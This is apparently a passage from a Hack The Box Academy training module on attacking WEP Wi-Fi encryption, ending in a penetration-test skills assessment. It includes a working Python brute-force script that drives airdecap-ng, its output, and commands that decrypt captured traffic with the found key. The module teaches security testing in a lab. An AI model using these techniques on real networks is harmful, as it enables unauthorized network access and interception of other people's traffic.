    3    0/  1   3A( 148) EC(  20) EB(  16) FB(  13) 81(  12) D7(  12) ED(  12) F0(  12)
    4    0/  1   03( 140) 90(  31) 4A(  15) 8F(  14) E9(  13) AD(  12) 86(  10) DB(  10)
    5    0/  1   D0(  69) 04(  27) 60(  24) C8(  24) 26(  20) A1(  20) A0(  18) 4F(  17)
    6    0/  1   AF( 124) D4(  29) C8(  20) EE(  18) 3F(  12) 54(  12) 3C(  11) 90(  11)
    7    0/  1   DA( 168) 90(  24) 72(  22) F5(  21) 11(  20) F1(  20) 86(  17) FB(  16)
    8    0/  1   F6( 157) EE(  24) 66(  20) DA(  18) E0(  18) EA(  18) 82(  17) 11(  16)
    9    1/  2   7B(  44) E2(  30) 11(  27) DE(  23) A4(  20) 66(  19) E9(  18) 64(  17)
   10    1/  1   01(   0) 02(   0) 03(   0) 04(   0) 05(   0) 06(   0) 07(   0) 08(   0)

             KEY FOUND! [ AB:C7:7F:3A:03:D0:AF:DA:F6:8D:A5:E2:C7 ]
	Decrypted correctly: 100%

```

* * *

### Bruteforce WEP cracking

When attempting to crack WEP encryption, attackers typically gather enough encrypted packets using tools like `airodump-ng` and then use `aircrack-ng` to successfully decipher the key. However, there are situations where the available packet count isn't sufficient for online cracking. In such cases, the attacker may switch to an offline approach, using `dictionary` or `brute-force` methods to try and break the key.

![image](https://academy.hackthebox.com/storage/modules/185/Airdecap/wep_original.png)

As shown in the above screenshot, we have captured a small amount of data using `airodump-ng`, which is not enough to generate sufficient IVs for cracking WEP encryption. To perform a brute-force attack, we can attempt to decrypt the packet using `airdecap-ng` with each password from the list. If a packet is successfully decrypted, it indicates that we have found the correct WEP key.

We can write a Python script that converts each 5-character password from the password list into its hexadecimal equivalent and then uses a loop to test each one with `airdecap-ng` to check if it successfully decrypts the traffic.

```python
import sys
import binascii
import re
from subprocess import Popen, PIPE
import time

# Start timer
start_time = time.time()

# File paths
cap_file = '/opt/WEP-01.cap'
wordlist_path = '/opt/1000000-password-seclists.txt'
wordlist = []

# Read wordlist file to a list
with open(wordlist_path, 'r') as f:
    wordlist = f.readlines()

# Iterate over the wordlist
for ln, word in enumerate(wordlist, start=1):
    # Clean the line to remove non-alphanumeric characters
    key = re.sub(r'\W+', '', word)

    # Filter wordlist to only keep 5-character long words
    if len(key) != 5 :
        continue

    # Encode the WEP key to bytes and convert to hexadecimal
    hex_key = binascii.hexlify(key.encode('utf-8'))

    # Print the current attempt
    print(f"{ln}: Trying Key: {key} Hex: {hex_key}")

    # Run airdecap-ng with the current WEP key
    p = Popen(['/usr/bin/airdecap-ng', '-w', hex_key, cap_file], stdout=PIPE)
    output = p.stdout.read().decode("utf-8")

    # Check if the key was successful
    if int(output.split('\n')[5][-1]) > 0:
        print(f"Success! WEP key found: {key}")
        end_time = time.time()
        print(f"Total time: {end_time - start_time:.6f} seconds")
        sys.exit(0)

# If no key was found
print("No WEP key found")

```

In the above Python script, the capture file `WEP-01.cap` is assigned to the `capture_file` variable, while the password list is loaded into the `wordlist` variable. The script then iterates through the list of passwords in a for-loop, using `airdecap-ng` to test each one. Afterwards, the script checks the output for the line containing `'Number of decrypted WEP packets'`. If the number of decrypted packets is greater than 0, it indicates that the packet was successfully decrypted and the correct WEP key has been found.

```shell
python3 bruteforce.py

6: Trying Key: b'12345' Hex: b'3132333435'
27: Trying Key: b'empty' Hex: b'656d707479'
125: Trying Key: b'11111' Hex: b'3131313131'
182: Trying Key: b'money' Hex: b'6d6f6e6579'
220: Trying Key: b'angel' Hex: b'616e67656c'
227: Trying Key: b'enter' Hex: b'656e746572'
229: Trying Key: b'chris' Hex: b'6368726973'
245: Trying Key: b'james' Hex: b'6a616d6573'
263: Trying Key: b'floor' Hex: b'666c6f6f72'
279: Trying Key: b'tiger' Hex: b'7469676572'
284: Trying Key: b'55555' Hex: b'3535353535'
<SNIP>
49910: Trying Key: b'crass' Hex: b'6372617373'
49921: Trying Key: b'conni' Hex: b'636f6e6e69'
49950: Trying Key: b'cious' Hex: b'63696f7573'
49951: Trying Key: b'chupa' Hex: b'6368757061'
49965: Trying Key: b'chiar' Hex: b'6368696172'
49972: Trying Key: b'cheek' Hex: b'636865656b'
Success! WEP key found: b'cheek'
Total time: 6.088396 seconds

```

As demonstrated in the output above, the brute-force process successfully identified the password as `cheek`. Its corresponding hexadecimal value is `636865656b`.

With the correct key in hand, we can now decrypt any WEP-encrypted data captured during the session using `airdecap-ng`, allowing further analysis of network traffic using tools like Wireshark.

```shell
airdecap-ng -w 636865656b WEP-01.cap

Total number of stations seen            2
Total number of packets read             9
Total number of WEP data packets         7
Total number of WPA data packets         0
Number of plaintext data packets         0
Number of decrypted WEP  packets         7
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets         0
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0

```

After successfully decrypting the WEP traffic with airdecap-ng, a new file will be generated, typically named something similar to `WEP-01-dec.cap`.

Opening this file in Wireshark reveals that the traffic has indeed been decrypted. We can now view the plaintext content, including network protocols, payload data, and any other information that once veiled by ciphertext.

![image](https://academy.hackthebox.com/storage/modules/185/Airdecap/wep_decrypt.png)

We can also use the WEP key `'636865656b'` to connect to the Wi-Fi network.

* * *

## Closing Thoughts

WEP (Wired Equivalent Privacy) serves as a cautionary tale in network security, illustrating the critical importance of robust encryption methods. Its well-documented vulnerabilities highlight the necessity of transitioning to stronger standards like WPA2 and WPA3. As we advance through our infosec journey, the lessons learned from WEP remind us to prioritize ongoing improvement and vigilance.


# Wired Equivalent Privacy Attacks - Skills Assessment

* * *

## Scenario

* * *

The CISO of our client, `Pixel Studios`, recently attended an electrifying cybersecurity conference, where they actively participated in a session on Wired Equivalent Privacy Attacks. This experience has heightened their awareness of potential vulnerabilities within their Wi-Fi infrastructure, which is crucial for the company's development, testing, and daily operations. Consequently, the CISO has expressed a serious concern about the security of their wireless networks and has requested our expertise to perform a comprehensive penetration test. Our task is to map out the available wireless networks, identify their BSSIDs, and test for vulnerabilities in their encryption, configuration, and client interactions.

Your objective is to uncover any flaws that could be exploited to gain unauthorized access or disrupt the network, ensuring `Pixel Studios` can address these issues promptly and maintain a secure wireless environment.

Harness the Wi-Fi WEP attack techniques you learned in this module to disclose all of the security vulnerabilities.

* * *

Note: Please wait for 2 minutes after the target spawns before connecting.


